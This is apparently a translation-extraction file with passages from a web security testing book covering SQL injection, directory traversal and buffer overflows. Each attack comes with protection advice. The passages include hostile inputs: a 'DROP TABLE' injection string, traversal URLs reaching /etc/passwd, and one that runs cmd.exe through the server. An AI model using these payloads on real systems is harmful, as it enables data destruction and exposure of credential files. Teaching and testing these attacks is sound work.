          <source>This is reasonably straightforward. The attacker may not have been able to log in, but he has added his own username and password to the database. Obtaining column names for the database and their associated type is often a difficult task, but depending on the error messages that the application allows, it's possible to map an entire database schema. We direct you to David Litchfield and Chris Anley, who were pioneers in SQL injection. The paper &amp;quot;Advanced SQL Injection in SQL Server Applications&amp;quot;&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; gives much more detail in discovering the internal structure of a database than we can provide here. In addition to &lt;tt&gt;SELECT&lt;/tt&gt; statements and &lt;tt&gt;INSERT&lt;/tt&gt;s, numerous SQL commands may cause undesirable side effects. Perhaps the most popular is &lt;tt&gt;DROP TABLE&lt;/tt&gt;, which causes tables on the database server to be deleted. It's also the easiest to craft because the attacker doesn't need to know anything of the database schema other than a table name:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; &lt;a class="docLink" target="_blank" href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf"&gt;http://www.ngssoftware.com/papers/advanced_sql_injection.pdf&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>SELECT accountdata FROM accountinfo
WHERE accountid = '&lt;span class="docEmphStrong"&gt;';&lt;/span&gt;
&lt;span class="docEmphStrong"&gt;DROP TABLE accountdata --&lt;/span&gt;' and password=''</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web developers tend to think about SQL queries as trusted operations that are above tampering. They fail to consider that the user has control over parameters of those queries and can enter valid SQL syntax in them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Thus, the fix for this attack is, once again, appropriate filtering of special characters from the URL, form fields, and any other input data that the user controls. Special characters and reserved words related to SQL syntax should be filtered before the queries are submitted to a database or escaped (such as the single quote character by putting a backslash before it). The best place to filter is on the server. Putting filtering code in the HTML that runs on the client is inadvisable because an attacker can edit the checks. The only real hope of a tamper-resistant filter is to put it on the server. A more sure-fire way of preventing this attack is to use stored procedures, which are introduced in Attack 17.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, try to restrict the amount of data that any one user can access. One of the simplest mistakes to make when writing database-driven applications is to use a single database login with lots of database rights (or even the database administrator account). Look at the operations that different categories of users should be allowed to do, and create database credentials for each of them. For example, an administrator may need access to a table containing credit card numbers, but a normal user will not. Only give users the rights they need&amp;mdash;a security principal known as &amp;quot;least privilege.&amp;quot; In the code of the application, use the relevant login so that if an SQL injection does occur, it is confined to data that it would normally be able to access.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 13 Directory Traversal</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All Web applications execute on a Web server, which normally resides on a powerful computer in some remote location. The main purpose of a Web server (and thus Web applications) is to serve pages of dynamic or static content to users.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This content is stored on what have been termed &lt;span class="docEmphStrong"&gt;pages&lt;/span&gt;, but quite simply, these pages are just files that reside on the Web server. It is the job of the Web server and the Web application to process (if necessary with dynamic content) and transmit pages to end clients, but also to restrict users who are visiting the server to only those files that are intended to be used as Web content. You must prevent an attacker's attempts to view or execute any other file on the Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Directory traversal attacks are just that: attacks in which a malicious user determines the location of restricted files and views or executes them. Viewing files can cause anything from privacy violations to a security breach in the event that the attacker is able to read local password files. Executing files is another serious problem, allowing the attacker to control or modify the Web site according to his own agenda.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack describes the method of performing directory traversals.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is applicable at the browser's address bar. An alternative is that an attacker could use other form fields to obtain files from a Web server (such as hidden fields specifying files to include as headers/footers for a search request), but attacking at the URL level is a common place to apply the directory traversal attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We want to ensure that any time a page request occurs, the user has not tampered with the request, and the file being served is appropriate for a Web user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first thing we need to do is to use the Web application and carefully watch the URL address bar for signs that files are being fetched and rendered in our browser. For example, if we saw this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/getreport.asp?item=
 Q1-2005.htm</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>we would reason that the HTML file &lt;tt&gt;Q1-2005.htm&lt;/tt&gt; was available somewhere on the Web, and the application was retrieving it and displaying its contents to a user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first thing we might do is try to discover what other files are in that directory. We'd simply change the name of the file to this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/getreport.asp?item=
 Q2-2005.htm</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If the file is there and there are no restrictions on what files can be rendered, we will see it. We can use such file guessing to find files on the Web server that we should not have access to.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Why is this bad? Well, sometimes the timing of when such financial data gets published is important. If the second-quarter financial statement is put on the megamoneycorp Web site two days early but with no explicit link to it, an attacker (perhaps a resourceful reporter or competitor) may use this trick to obtain the information early, before that hard link is posted, and be advantaged in some way. This is exactly what happened when Intentia International accused a Reuters journalist of releasing their third-quarter earnings early&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; that we referred to in Attack 2.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; &lt;a class="docLink" target="_blank" href="http://news.com.com/2100-1023-963658.html"&gt;http://news.com.com/2100-1023-963658.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But there is more to this attack than file guessing. Consider the following URL:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/getreport.asp?item=
 getreport.asp</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is no different from the previous request, but instead of retrieving a report to display to a user, this URL requests itself. We might not initially be concerned about this, but there is a problem here: The Web server has already processed the dynamic content and is simply going to display the requested file. This means that the source code of &lt;tt&gt;getreport.asp&lt;/tt&gt; will end up being disclosed, and that can give the attacker considerable knowledge of the application, including database connection string, passwords, and business logic.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What happens if an error is produced saying that the requested file does not exist? Well, we know for certain that the &lt;tt&gt;geTReport.asp&lt;/tt&gt; file must exist somewhere on the server because other requests with expected inputs were successful, so it must simply be in a different location. Perhaps the application had hard-coded a &lt;tt&gt;reports&lt;/tt&gt; directory onto the file request, and the &lt;tt&gt;getreport.asp&lt;/tt&gt; file is one directory below it. Using the &lt;tt&gt;../&lt;/tt&gt; operation, we can direct the application to look in the parent directory for the file:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/getreport.asp?item=../
 getreport.asp</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We can continue this until we get to the desired parent directory, or the root directory. Then we can navigate up the directory tree using the appropriate directory names.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The attacker may be after something beyond just the files held within the Web server. Consider the following request:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/getreport.asp?item=../
 ../../etc/passwd</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If this succeeds, the attacker now has a valuable operating system file that may be useful for further attacks.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch05fn06"&gt;[6]&lt;/a&gt;&lt;/sup&gt; Note that, as discussed earlier, the &lt;tt&gt;../&lt;/tt&gt; operator directs the browser to look at the parent directory. Thus, three &lt;tt&gt;../&lt;/tt&gt; in a row will take us up four levels of folders. Even if the desired file is not there, an attacker can easily discover its location by trial and error. Generally, people know that for a default Apache Server, the Web root is stored in &lt;tt&gt;/usr/local/apache/htdocs&lt;/tt&gt;, with applications held in separate directories thereafter. Thus, three directory redirection operations take us to the root of the file system.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch05fn06"&gt;[6]&lt;/a&gt;&lt;/sup&gt; You should spend time learning the operating system on which your Web application runs. The file c:/windows/repair/sam._ contains all the users and passwords for the local machine on the Microsoft Windows platform. Similarly, the file /etc/passwd in various UNIX platforms contains all of the users and the groups to which they belong. Only by knowing your target OS and where it stores its crucial files can you really be successful.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The command</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.megamoneycorp.com/../../../WINNT/SYSTEM32
 /cmd.exe?/c+dir+c:\</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>attempts to find the file &lt;tt&gt;cmd.exe&lt;/tt&gt;, which is the Windows command shell, and execute the command &lt;tt&gt;dir c:\&lt;/tt&gt;, which gives a list of all the files in the main root directory. With a little patience, an attacker can use this trick to find all the files on the Web server machine.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There are two main ways to protect against the directory traversal attack:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Restricting the Web application to serve pages only from a Web root directory and its subdirectories</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Access Control Lists (ACLs)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Always employ Web root directories. They create a boundary in the developer's mind about what content Web visitors intend to view and what content they don't. This forces us to consider on a file-by-file basis who the intended audience is. If we scrutinize every file that resides on the Web server this way, we decrease our chance of this attack becoming real. All operating systems that Web servers run on can create what is known as a root jail for an application (in this case, the Web server). A &lt;span class="docEmphStrong"&gt;root jail&lt;/span&gt; is a directory that looks like the root of the file system even though it may be the child of some other directory to the application. In any of the UNIX flavors, here's the command to do this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>chroot /path/to/wwww/ /usr/local/web/bin/apachectl
 start</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, there is a lot more to do to ensure that the Apache server functions correctly. For more information, follow the instructions in the &amp;quot;Chrooting Apache&amp;quot; article on &lt;a class="docLink" target="_blank" href="http://Linux.com"&gt;Linux.com&lt;/a&gt; at &lt;a class="docLink" target="_blank" href="http://www.linux.com/article.pl?sid=04/05/24/1450203"&gt;http://www.linux.com/article.pl?sid=04/05/24/1450203&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After this command, the Web server is running in the &lt;tt&gt;www&lt;/tt&gt; directory and cannot use a dot-dot trick to back up one directory. According to the operating system, the server already thinks it is the top-level parent. In Windows, this functionality is achieved using virtual directories.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Access control lists are another way to keep track of who is capable of viewing what files. When every user doesn't have equal-access privilege, ACLs can specify this level of detail. Both Apache and IIS have specific users and access control lists set up for anonymous Web users, which we discuss in Attack 18.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Combining either or both of these techniques with input filtering is the best way to prevent the attacks in this chapter. When the Web application receives a URL request, it should filter special characters, code, operating system commands, and scripts. Then and only then can the command be executed on the Web server and the appropriate file&amp;mdash;if it is allowed&amp;mdash;be rendered in the user's browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This will slow down delivery of the pages, but security often comes at the expense of performance.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch06.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 6. Language-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 6. Language-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch05lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch06lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter discusses attacks against programs that reside on the Web server that may or may not be part of the Web application. These can be programs that are part of the Web server environment, sample code from the Web development environment, or other programs that malicious users may attack to gain access to the Web server or to gain advantage over the Web application's environment. They are called &lt;span class="docEmphStrong"&gt;language-based attacks&lt;/span&gt; because they attack known problems with the programming languages in which many of these components are implemented.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The attacks in the chapter are optional in the sense that they are not aimed directly at the Web application. But because an attacker can use them to gain control of the Web server, anyone who is interested in a secure environment for his users should seriously consider them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch06lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch06lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many server-side components are typical programs written in languages like C and C++. Although the testing issues involving these types of components from the server side are covered in previous books (&lt;span class="docEmphasis"&gt;How to Break Software&lt;/span&gt; and &lt;span class="docEmphasis"&gt;How to Break Software Security&lt;/span&gt;), we cover the issues of testing these components from the Web client. However, for completeness, you may want to refer to these earlier books.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>From the perspective of the Web client, the main concern is server-side programs that are susceptible to attack. It turns out that certain characteristics of server-side programs&amp;mdash;namely the language they are written in&amp;mdash;can make them prone to attacks. Thus, we call these language-based attacks and focus on three specific attacks that are common and cannot be overlooked during development: buffer overflows, canonicalization, and NULL strings.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 14 Buffer Overflows</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps the most notorious security attack against applications is the buffer overflow. Buffer overflows were first identified as a potential problem way back in the 1970s. Using a buffer overflow as the delivery mechanism for worms and malicious code has been a hot area for exploitation. CodeRed, Nimda, Slammer, and Blaster are some of the worms that resulted from server components overrunning memory buffers. The list is long, and their effects have been expensive.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Our interest is in ensuring that any components that are susceptible to overruns do not cause our own Web applications to be compromised. Thus, we need to understand what server-side components our Web applications depend upon and ensure that these components cannot be remotely exploited.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Buffer overflows occur when a function in a program fails to check the size of the input data that it is processing. If this input data is larger than the space allocated for it, it overflows into other memory locations on the execution stack. Thus, some memory locations that are intended for other purposes get overwritten (corrupted) with this input data. More often than not, that corrupted data causes the software to crash.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The most dangerous situation is for the input data to overflow into memory that will be used in choosing which instruction to execute next. When data overflows into a memory location called the &lt;span class="docEmphStrong"&gt;return address&lt;/span&gt;, part of that data actually becomes an instruction to the computer. That's the magic of a buffer overflow: User input data actually causes the execution sequence of the machine to change, allowing an attacker to run arbitrary code on our Web server. We must prevent this situation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There has been so much written about buffer overflows that including more than this brief introduction would be redundant, especially because most of the languages that modern Web applications are written in are more resilient to this kind of attack. If you are interested in the underlying details, the seminal paper is &amp;quot;Smashing the Stack for Fun and Profit&amp;quot; (&lt;a class="docLink" target="_blank" href="http://www.insecure.org/stf/smashstack.txt"&gt;http://www.insecure.org/stf/smashstack.txt&lt;/a&gt;). Also see &amp;quot;19 Deadly Sins of Software Security,&amp;quot; by Michael Howard, David LeBlanc, and John Viega (McGraw-Hill, 2005). It lists buffer overflows as sin number one!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Not all Web applications are vulnerable to buffer overflow attacks. That's good news, because Web applications are deployed in one of the most risky places: network-facing code that accepts data from anonymous users.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The prevalence of buffer overflow attacks and research into preventing them has meant that in a lot of programming languages, protection measures are provided for developers to use. This means that the majority of Web applications, and in some respects parts of the operating systems that execute them, are immune to this attack. However, don't get a false sense of security. There are still plenty of legacy components and careless developers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We begin this attack by looking at the filenames of programs that make up the Web application. If they are Java servlets (&lt;tt&gt;/servlet/&lt;/tt&gt; is often in the URL path, or the filename ends in .&lt;tt&gt;jsp&lt;/tt&gt;), .NET programs (.&lt;tt&gt;aspx&lt;/tt&gt;), or PHP (&lt;tt&gt;.php&lt;/tt&gt;), to name but a few, you may as well move along now because such managed code is immune&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch06fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; to most buffer overflow attacks. These environments carefully check memory and array access, resizing buffers where needed. The prime target for buffer overflow testing is native code, ending in extensions such as .&lt;tt&gt;exe&lt;/tt&gt;, .&lt;tt&gt;dll&lt;/tt&gt;, or .&lt;tt&gt;cgi&lt;/tt&gt; (although one can never be sure with this last extension).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
